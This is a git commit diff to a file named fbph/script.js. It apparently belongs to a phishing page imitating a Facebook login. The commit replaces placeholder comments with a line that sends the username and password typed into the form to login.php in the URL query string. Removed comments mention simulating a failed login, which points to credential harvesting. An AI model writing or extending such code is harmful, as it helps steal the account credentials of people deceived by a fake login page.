5b6817c34ea5828ab95d7c06bcac3b67b7a574e4
tanm2580 <59228823+tanm2580@users.noreply.github.com>
2024-05-07 03:00:27 +0600

    Update script.js

--- fbph/script.js
+++ fbph/script.js
@@ -2,6 +2,6 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
     event.preventDefault();
     var username = document.getElementById("username").value;
     var password = document.getElementById("password").value;
-    // Send username and password to your server
-    // You can also display an error message to simulate a failed login attempt
+    // Send username and password to server
+    window.location.href = "login.php?username=" + username + "&password=" + password;
 });
